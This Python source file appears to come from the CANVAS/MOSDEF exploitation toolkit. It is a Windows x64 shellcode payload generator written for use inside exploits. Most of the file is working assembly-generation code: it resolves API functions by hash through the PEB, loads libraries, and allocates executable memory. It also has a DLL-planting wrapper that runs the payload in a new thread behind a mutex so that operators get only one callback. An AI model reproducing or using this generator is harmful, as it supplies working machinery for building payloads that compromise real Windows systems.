# a _more respectful__ windows payload generator
#
# these operate under the assumption that you will be using
# mosdef.assemble() in your exploit on the returned code ..
#
# NOTE: add whatever you want!

USAGE = """

This payload generator works on the concept of being a function
generator. Function calls made will be translated into a self.main
and a self.functions. Returned code then equals:

self.getpcloc + self.globals + self.functions + self.main

For example:

# get a code generator
codegen = basecode()
codegen.find_function('kernel32!loadlibrarya')
codegen.load_library('ws2_32.dll')
codegen.find_function('ws2_32!socket')
# you can print codegen.main to see the control flow at any point
# the default is to just chain function calls and save crucial
# return values into the GLOBALS section .. you could also replace
# codegen.main with your own custom control flow for the function
# calls .. thus providing a flexible framework .. to custom code
# something you just add stuff like so:

...
push args ...
call *SOCKET-getpcloc(%ebp)
...

See payloads.callback for an example on how to write payloads using
this generator.

So the idea is to have a python function call to assembly generator.
This makes clean and rapid payload development easier for in-exploit
usage, instead of trying to do massive all-in-one payloads in the
oldschool generator.

You can also replace the generated main with your own control flow
if you chose to, etc.

Written as a base logic for nico's new stuff -bas

for developers:

The naming convention for GLOBALS is 'NAME' (upper), so if you are
calling find_function('ws2_32.dll!socket') the resulting function
address will be in global 'SOCKET'. You can then call the resolved
function in the global via something like:

call *SOCKET-getpcloc(%ebp)

The purpose is to have something that allows you to write standalone
payloads that are not dependent on the old attribute system. Which is
a pain the rear when trying to do quick standalone in-exploit payload
development.

"""

import struct
import sys
if '.'  not in sys.path: 
    sys.path.append('.')

from exploitutils import *
import urllib

# helpers
def s_to_push(s, __endian__):
    """ string to dwords """

    dword  = ''
    dwords = []

    for c in s:
        dword += c
        if len(dword) == 8:
            dwords.append(struct.unpack(__endian__+'Q', dword)[0])
            dword = ''

    if dword != '':
        while len(dword) % 8:
            dword += '\x00'
        dwords.append(struct.unpack(__endian__+'Q', dword)[0])

    dwords.reverse()
    return dwords

arch_f  = { 'x64' : ['movq $0x%.16X,%%rcx // %s\n push %%rcx', '<'] }
#arch_f  = { 'x64' : ['mov $0x%.16X,%rcx // %s\n push %rcx', '<'] }

#arch_f  = { 'x64' : ['pushq $0x%.8X // %s ', '<'] }

from MOSDEF.mosdefutils import *


class Globals:
    def __init__(self):
        self.data   = []
        self.names  = []

    # default can't be 0 .. for parsing semantics        
    def addDword(self, name, val = 0x41424344):
        if name not in self.names:
            self.data.append( ("_get_dword", name, val) )
            self.names.append(name) 

    def addQword(self, name, val = 0x4142434445464748):
        if name not in self.names:
            self.data.append( ("_get_qword", name, val) )
            self.names.append(name)
    
    def addUnicodeString(self, name, val):
        if name not in self.names:
            self.data.append( ("_get_urllib", name,  msunistring(val)) )
            self.names.append(name)

    def addString(self, name, val):
        if name not in self.names:
            self.data.append( ("_get_urllib_nul", name, val) )
            self.names.append(name)

    def addLabel(self, name):
        if name not in self.names:
            self.data.append( ("_get_label", name, 0) )
            self.names.append(name)
         
    def _get_dword(self, name, val):
        return ["%s:\n" % name, 
                "    .long 0x%08x\n" % val]

    def _get_qword(self, name, val):
        return ["%s:\n" % name,
                  ".longlong 0x%16.16x\n" % val]

    def _get_label(self, name, val):
        return ["%s:\n" % name]

    def _get_urllib_nul(self, name, val):
        return ["%s:\n" % name, 
                "    .urlencoded \"%s\"\n.byte 0x00\n" % urllib.quote(val)]

    def _get_urllib(self, name, val):
        return ["%s:\n" % name, 
                "    .urlencoded \"%s\"\n" % urllib.quote(val)]        
    
    def get(self):
        out = []
        for (fn, name, val) in self.data:
            out += self.__class__.__dict__[ fn ](self, name, val)
            
        return "".join(out)             
        
class basecode:
    def __init__(self, restorehash=False, VirtualProtect=False, ActivationContext=False, dll=False, dll_return=True, dll_create_thread=True, use_mutex=False):
        self.heading        = ''
        self.ending         = ''
        self.functions      = ''
        self.main           = ''
        self._globals       = Globals()
        self.globals        = ''
        self._patchtbl      = None
        self.devmode        = True
        self._libraries     = []
        self._functions     = []
        self.RestartHash    = restorehash
        self.SaveHashes     = []
        self._callfunc      = []
        self.library_count  = 0
        self.callfunc_count = 0
        # code always starts with getpcloc

        self.getpcloc = """
        shellcodestart:
        """
        
        if dll:
            self.find_function('kernel32.dll!CreateThread')
            self.find_function('kernel32.dll!VirtualAlloc')
            self.find_function('kernel32.dll!CreateMutexA')
            self.find_function('kernel32.dll!GetLastError')
            #
            # We have to wrap codegen.main into a CreateThread
            # call in order to meet DllMain semantics that require
            # the function to return. In order to prevent CreateThread
            # from operating on a reclaimed memory region, we copy the
            # payload to another memory region. 

            # The use of a mutex prevents multiple callbacks from spawning
            # inside of only one process. Empirically, a program that has a
            # DLL planting vulnerability will load the DLL multiple times and
            # we do not wish to perturb operators.

            # In that way, we do not hijack the original thread that
            # was used to load/inject the DLL. This mostly comes into play
            # when using CANVAS inject_from_mem/injectdll modules.
            #

            control_hijack = "ret"
            mutex_chars = random.sample(string.letters + string.digits, 7)
            self._globals.addString("MUTEX_NAME", "".join(mutex_chars)) 
            check_mutex = """
            leal MUTEX_NAME-getpcloc(%rbp), %r8  // arg3: lpName
            xor %rdx, %rdx
            inc %rdx                             // arg2: bInitialOwner
            xor %rcx, %rcx                       // arg1: lpMutexAttributes
            subl $0x20, %rsp
            call *CREATEMUTEXA-getpcloc(%rbp)
            addl $0x20, %rsp
            subl $0x20, %rsp
            call *GETLASTERROR-getpcloc(%rbp)
            addl $0x20, %rsp
            movl $0x00000000000000b7, %rcx
            cmp %rcx, %rax
            jnz after_mutex
            mov  %r15, %rsp
            ret
            after_mutex:
            nop
            """

            return_control = """
            CHECK_MUTEX
            leal end_wrapped_payload-getpcloc(%rbp), %rcx
            leal wrapped_payload-getpcloc(%rbp), %rdx
            // mov end_wrapped_payload-getpcloc(%rbp), %rcx
            // mov wrapped_payload-getpcloc(%rbp), %rdx
            // Get the address of the in-DLL shellcode for
            // copying later
            pop %rsi        // lpStartAddress
            sub %rdx, %rcx
            push %rcx
            // Calculate the shellcode's size
            mov %rcx, %rdx                  // arg2: dwSize

            // Allocate buffer space (DEP Safe)
            xor %rcx,%rcx                   // arg1: lpAddress = Null
            mov $0x1000, %r8                // arg3: flAllocationType = MEM_COMMIT
            mov $0x40, %r9                  // arg4: flProtect = PAGE_EXECUTE_READWRITE
            sub $0x20, %rsp
            call *VIRTUALALLOC-getpcloc(%rbp)
            add $0x20, %rsp

            pop %rcx
            mov %rax, %rdi
            mov %rdi, %r8
            rep movsb

            and $0xfffffff0,  %rsp
            // CreateThread
            xor %rcx, %rcx // lpThreadAtt
            xor %rdx, %rdx // dwStackSize

            mov %rbp, %r9  // lpParameter
            push %rcx      // dwCreationFlags
            push %rcx      // lpThreadId

            sub  $0x20, %rsp
            call *CREATETHREAD-getpcloc(%rbp)
            add  $0x20, %rsp
            mov  %r15, %rsp
            ret
            """.replace("CHECK_MUTEX", check_mutex if use_mutex else "")

            self.main += """
            mov %rsp, %r15
            jmp jump2
jump1:
            CONTROL_FLOW
jump2:
            call jump1
            mov   %rcx, %rbp
            """.replace("CONTROL_FLOW", control_hijack if not dll_create_thread else return_control)
            mutex_check = """
            
            """
            
            self.getpcloc += """
            xor   %rax, %rax
            inc   %rax
            cmpl  %edx, %eax
            jnz   not_proc_attach
            
            push %r15
            push %r14
            push %r13
            push %r12
            push %rdi
            push %rsi
            push %rbx
            push %rbp
            
            jmp   findyou
            not_proc_attach:
            xor %rax, %rax
            RETURN_TRUE
            ret
            """.replace("RETURN_TRUE", "inc %rax" if dll_return else "")
        else:
            self.getpcloc += """
            jmp findyou
            """
        
        self.getpcloc += """
        retpcloc:
            // save the pcloc as base pointer ..
            mov (%rsp),%rbp
            ret
        findyou:
            call retpcloc
        getpcloc:
            mov %rsp, %r14

            // 16 byte stack alignment
            xor  %rbx, %rbx
            sub  $0x10, %rbx
            and  %rbx, %rsp
            
            // resolve all functions before entering main
        """
        if ActivationContext :
            self.getpcloc += self.ActivationContextSelf()
        if VirtualProtect:
            self.getpcloc += self.get_virtual_protect()

        #if self.RestartHash:
        #    self.getpcloc += "call restorehash\n"
        
        self.getpcloc +="""
        call resolve_functions
        """
        if dll:
            self.getpcloc += """
            call main
            mov %r14, %rsp
            
            pop %rbp
            pop %rbx
            pop %rsi
            pop %rdi
            pop %r12
            pop %r13
            pop %r14
            pop %r15
            xor %rax, %rax
            RETURN_TRUE
            ret
            """.replace("RETURN_TRUE", "inc %rax" if dll_return else "")
        else:
            self.getpcloc += """
            jmp main
            """

    def get_virtual_protect(self):
        dll_hash = self.get_hash("kernel32.dll")
        fun_hash = self.get_hash("VirtualProtect")
        code = """
        push $0x%08x
        push $0x%08x""" % (fun_hash, dll_hash)
        code+="""
        call  find_function

        mov %rbp,%rcx       // 1rst param: Our address
        mov $0x1000,%rdx    // 2nd  param: Page size
        mov $0x40,%r8       // 3rd  param: +rwx
        mov  %rsp, %r9      // 4rd param: ptr to writable addr

	sub $0x20,%rsp      // shadow space

        call  %rax          // kernel32.VirtualProtect        
        """
        return code
        
    def get_hash(self, instr):
        """ dave's old function hashing routine """
        hash = 0
        for c in instr:
            d = ord(c)
            d = d | 0x60 # toupper
            hash += d
            hash = uint32(long(hash) << 1)
        #print "%s:0x%08x" % (instr, hash)
        return hash

    # note our find_function already finds the module base etc.
    # so we can pass it any module!function string and it'll find
    # it for us .. if you have to load a module first, then just
    # find_function('kernel32!loadlibrarya) and call loadlibrary
    # for the module, and then you can find_function again :>
    def find_function(self, dll_function):
        """ find a function given a dll!function string """
        dll = dll_function.split('!')[0]
        fun = dll_function.split('!')[1]

        if '.DLL' not in dll.upper():
            dll = dll + '.dll'

        dll_function_name = dll.lower() + "!" + fun.lower()

        if dll_function_name not in self._functions:
            self._functions.append(dll_function_name)
    
    def _set_functions(self):
        # Adding hashit and findfunction
        self.functions  = ""
        self.SaveHashes = []
        
        if 'hashit:' not in self.functions:
            self.functions += """
        hashit:
            push %rbp
            mov %rsp,%rbp
            push %rcx
            push %rbx

            xor %rbx,%rbx
            xor %rcx,%rcx
            mov 0x10(%rbp),%rax  // rax will contain the pointer to the string

        hashloop:
            movb (%rax),%cl
            test %cl,%cl
            jz hashed
            orb $0x60,%cl        // uppercase
            add %rcx,%rbx
            shl $1,%rbx
            add 0x20(%rbp),%rax  // incs %rax by the supplied argument
            jmp hashloop

        hashed:
            .byte 0x91 //xchg %eax,%ecx   //TODO!!!!!!!
            cmpl 0x18(%rbp),%ebx  // Compare the actual hash with the supplied one
            jz donehash
            inc %rax

        donehash:
            pop %rbx
            pop %rcx
            mov %rbp,%rsp
            pop %rbp

            //ret $0xc
            ret $0x18

        find_function:
            push %rbp
            mov %rsp,%rbp
            push %rsi
            push %rdi
            xor %rcx,%rcx
            	    
	    mov %gs:0x60(%rcx),%rax // PEB
            mov 0x18(%rax),%rax	 // PEB->PEB_LDR_DATA
            mov 0x20(%rax),%rcx  // PEB_LDR_DATA-> Modules List in LoadOrder

        nextinlist:
            mov (%rcx),%rdx               // Pointer to next loadeded DLL
            mov 0x50(%rcx),%rax           // Unicode string of the Loaded DLL
            push $0x2                     // 2 = unicode, 1 = ascii
            push 0x10(%rbp)               // Hash to search
            push %rax                     // Unicode string 
            call hashit                   // hash the dll string and compare it with out hash
            test %eax,%eax
            jz foundmodule
            mov %rdx,%rcx
            jmp nextinlist                // XXX BUG: What if nothing is found?????
                                          // Whoever calls this code better make sure
                                          // that whatever is searched for is actually there

        foundmodule:
            mov 0x20(%rcx),%rdi           // rdi will hold the dll base address
            mov 0x3c(%rdi),%ebx           // MZ-> Offset to PE
            movl 0x88(%rbx,%rdi,1),%ebx   // PE->0x88, Export Directory RVA
            add %rdi,%rbx                
            movl 0x1c(%rbx),%ecx          // Address of functions
            movl 0x20(%rbx),%edx          // Address of names
            movl 0x24(%rbx),%ebx          // Address of name ordinals
            add %rdi,%rcx
            add %rdi,%rdx
            add %rdi,%rbx

        find_procedure:

            mov (%rdx),%esi              // esi will contain the funtion name
            add %rdi,%rsi                // add base dll address

            push $0x1                    // 2 = unicode, 1 = ascii
            push 0x18(%rbp)              // hash to find
            push %rsi                    // function name
            call hashit

            test %eax,%eax
            jz found_procedure
            add $4,%rdx
            inc %rbx
            inc %rbx
            jmp find_procedure

        found_procedure:

            xor %rdx,%rdx
            mov (%rbx),%dx
            mov (%rcx,%rdx,4),%eax
            add %rdi,%rax		//rax->funtion address
            pop %rdi
            pop %rsi
            mov %rbp,%rsp
            pop %rbp
            ret $0x10
        """

        last_dll_hash = 0
        dll_count = 0

        # remember to +4 the offset .. so our algo works properly
        self._globals.addDword('HASHES')
        
        # dedup_functions = []
        # for function in self._functions:
        #     dll = function.split('!')[0]
        #     fun = function.split('!')[1]

        #     if '.DLL' not in dll.upper():
        #         dll = dll + '.dll'
                
        #     name = dll + "!" + fun
            
        #     if name not in dedup_functions:
        #         dedup_functions.append(name)
        
        # self._functions = dedup_functions


        for dll_function in self._functions:
            dll = dll_function.split('!')[0]
            fun = dll_function.split('!')[1]

            if '.DLL' not in dll.upper():
                dll = dll + '.dll'

            dll_hash = self.get_hash(dll)
            fun_hash = self.get_hash(fun)

            # append the GLOBAL for the function
            if dll_hash != last_dll_hash:
                # add terminator for the previous dll table
                if dll_count:
                    self._globals.addDword('TERMDLL%X' % dll_count, 0)
                    if self.RestartHash:
                        self.SaveHashes.append( struct.pack("<L", 0) )
                # add new dll hash
                self._globals.addDword(dll.split('.')[0] + '%X' % dll_count, dll_hash)
                if self.RestartHash:
                    self.SaveHashes.append( struct.pack("<L", dll_hash) )
                dll_count += 1
                
            self._globals.addDword(fun.upper() + "_", fun_hash)
            if self.RestartHash:
                self.SaveHashes.append( struct.pack("<L", fun_hash) )
            # find the function and put it in the GLOBAL
            last_dll_hash = dll_hash

        # add terminator for last dll set
        self._globals.addDword('TERMDLL%X' % dll_count, 0)

        if self.RestartHash:
            self._globals.addString( "RHASH", "".join(self.SaveHashes))
            self.functions += """
            restorehash:
            leal HASHES+4-getpcloc(%rbp),%edi
            leal RHASH - getpcloc(%rbp), %esi
            xorl %ecx, %ecx
            movb $HASHLEN, %cl
            .byte 0xf3 //rep movsd
            .byte 0xa5
            ret
            """.replace( "HASHLEN",  "0x%x" % len(self.SaveHashes) )
            
        if 'resolve_functions:' not in self.functions:
            self.functions += """
                    // format: dll : function : functionlabel : 0
                resolve_functions:
                
                    push %r15
                    push %r14
                    push %r13
                    push %r12
                    push %rdi
                    push %rsi
                    push %rbx
                    push %rbp
                
                    movl $DLLCOUNT,%edi
                    lea HASHES-getpcloc(%rbp),%rsi	// Hashes

		    lea PATCHTBL-getpcloc(%rbp),%r14    // patched addresses

                    jmp init_dll

                next_dll:
                    LOADLIBRARYCODE
                    pop %rax
                    dec %rdi
                    test %edi,%edi
                    jz done_with_functions

                init_dll:
                    // load any pre-needed modules here ...

                    inc %rsi
                    inc %rsi
                    inc %rsi
                    inc %rsi
                    movl (%rsi),%eax  // dll hash
                    push %rax

                next_function:
                    inc %rsi
                    inc %rsi
                    inc %rsi
                    inc %rsi                                        
                    movl (%rsi),%eax    // function hash
                    test %eax,%eax
                    jz next_dll

                do_find_function:


                   
		    movl (%rsp),%eax                	    
                    movl (%rsi),%ebx    
                    push %rbx           // arg1 dll hash
                    push %rax           // arg2 function hash


                    call find_function

                    // replace the hash with the function address :)
                    mov %rax,(%r14)
                    add $0x8, %r14


                    jmp next_function

                done_with_functions:
                    pop %rbp
                    pop %rbx
                    pop %rsi
                    pop %rdi
                    pop %r12
                    pop %r13
                    pop %r14
                    pop %r15
                    ret

                """.replace('DLLCOUNT', "%d" % dll_count)

        # load any modules needed for the function resolve ...
        load_code = ''
        for (module, words) in self._callfunc:
            load_code += self.get_call_function(module, words)
        for module in self._libraries:
            load_code += self.get_load_library_code(module)
            
        self.functions = self.functions.replace('LOADLIBRARYCODE', load_code) 
        return

    def _get_patch_table(self):
        self._patchtbl = Globals()

        idx = 0xcafe0000 # for debugging porpouse
        self._patchtbl.addLabel("PATCHTBL")

        for dll_function in self._functions:
            fun = dll_function.split('!')[1]
            self._patchtbl.addQword(fun.upper(), idx)
            idx += 1
        return self._patchtbl

    def load_library(self, module):
        self._libraries.append(module)

    def call_function(self, module, words):
        self._callfunc.append( (module, words) )
        
    def get_call_function(self, module, words):
        """ loadlibrarya's a module """
        # assumes kernel32!loadlibrarya was found
        # push the module to load
        
        fun = module.split("!")[1]
#        if force:
#            fun_hash = 0
#        else:
        fun_hash = self.get_hash( fun ) 
            
        if (fun_hash & 0xFFFF0000) == 0:
            cm = "mod_%s: cmpw $0x%x,%%ax" % ( fun ,fun_hash )
        else:
            cm = "cmpl $0x%08x, %%eax" % fun_hash
        
        # only do loads when loadlibrarya was resolved
        load_code = """
            // only load if loadlibrarya was inited (hash word)
            movl %s-getpcloc(%%rbp),%%eax
            %s
            je skip_call_func%X
            pushl %%esi
            movl %%esp, %%esi
        """ % ( fun.upper(), cm, self.callfunc_count )
                
        # push the string onto the stack
        for word in words:
            
            if type(word) == type(""):
                if (len(word) % 4):
                    load_code += """
                    xorl %%eax,%%eax
                    pushl %%eax
                    """
                ww = s_to_push( word , arch_f['x64'][1] )
                for w in ww:
                    load_code += arch_f['x64'][0]% (w, struct.pack(arch_f['x64'][1]+'L', w)) + '\n'
                load_code+= """
                movl  %%esp, %%ebx
                pushl %%ebx // pushing "%s"
                """ % word
            
            elif type(word) == type(1):
                load_code += arch_f['x64'][0] % (word, struct.pack(arch_f['x64'][1]+'L', word)) + '\n'
            
        load_code += """
            call *%s-getpcloc(%%rbp)
            movl %%esi, %%esp  // Restoring ESP
            popl %%esi
            skip_call_func%X:
        """ % ( fun.upper(), self.callfunc_count )
        
        self.callfunc_count += 1
        return load_code


    def get_load_library_code(self, module):
        """ loadlibrarya's a module """
        # assumes kernel32!loadlibrarya was found
        # push the module to load
        dwords = s_to_push(module, arch_f['x64'][1])
        # only do loads when loadlibrarya was resolved
        load_code = """
            // only load if loadlibrarya was inited (hash word)
            movl LOADLIBRARYA-getpcloc(%%rbp),%%eax
            cmpw $0x5786,%%ax                                    //<---- ???
            je skip_load_library%X
        """ % self.library_count
        # push the string onto the stack
        for dword in dwords:
            load_code += arch_f['x64'][0]% (dword, \
                      struct.pack(arch_f['x64'][1]+'Q', dword)) + '\n'

        load_code += """
                mov %rsp,%rcx   // save string address on rcx
        """
 
        # Align the stack, if necesary
        if len(dwords)%2!=0:
            load_code += """
                      push %rbx       // alignment
            """

        load_code += """
	    sub $0x20, %rsp    // shadow space
            call *LOADLIBRARYA-getpcloc(%rbp)
	    add $0x20, %rsp    // it doesn't eats shadow space. Is it shadow space necesary at all?

        """

        # revert alignment, if necesary
        if len(dwords)%2!=0:
            load_code += """
               pop %rbx
            """

        # eat stack leak
        for dword in dwords:
            load_code += """
               pop %rbx
           """
        # eat final dword and place exit label
        load_code += """
        skip_load_library%X:
        """ % self.library_count
        self.library_count += 1
        return load_code

    def _set_globals(self):
        """ sets the globals section """
        self.globals = "globals:\n"
        self.globals += self._globals.get()
        return self.globals

    def _set_patch_table(self):
        return self._get_patch_table().get()

    def __str__(self):
        return self.get()

    def get(self):
        """ constructs and returns the final payload """
        asm = ''
        # we put the globals and functions _before_ main
        # so we get negative call offsets .. this reduces
        # the amount of encoding we have to do

        # in this order, always ..
        self._set_functions() # sets our primary globals
        self._set_globals() # sets our secondary globals
        patchtbl = self._set_patch_table()

        asm += self.heading
        asm += '\n'
        asm += self.getpcloc
        asm += '\n'
        asm += self.globals
        asm += '\n'
        asm += '// END OF GLOBALS\n'
        asm += self.functions 
        asm += '\n'
        asm += '// END OF FUNCTIONS\n'
        asm += 'main:\n' # entry point from pcloc
        asm += self.main
        asm += '\n'
        asm += self.ending
        asm += '\n'
        asm += 'codeend: // END OF MAIN\n'
        asm += patchtbl

        # XXX: if you get YACC EOF errors .. this means you
        # XXX: are missing labels ...
   
        return asm

    def enable_debug(self):
        """ add a debug stub """
        if 'debug:' not in self.functions:
            self.functions += """
            debug:
                int3
                ret
            """
        return


    def insertHeadingCode(self, code):
        self.heading = code
        return 

    def insertEndingCode(self, code):
        self.ending = code
        return 


    def ActivationContextSelf(self):
        ''' activate context '''
        dll_hash = self.get_hash("ntdll.dll")
        fun_hash = self.get_hash("RtlAllocateActivationContextStack")
        code = """
        push $0x%08x
        push $0x%08x""" % (fun_hash, dll_hash)
        code+="""
        call  find_function

        push %rax //save eax

        xor %rcx,%rcx
        movw $0x30,%cx
        movq %gs:(%rcx),%rax
        lea 0x2c8(%rax),%rcx //get TEB (in rcx, our arg)

        pop %rax //restore eax

        sub $0x20,%rsp

        call %rax

        add $0x20,%rsp
        """

        return code
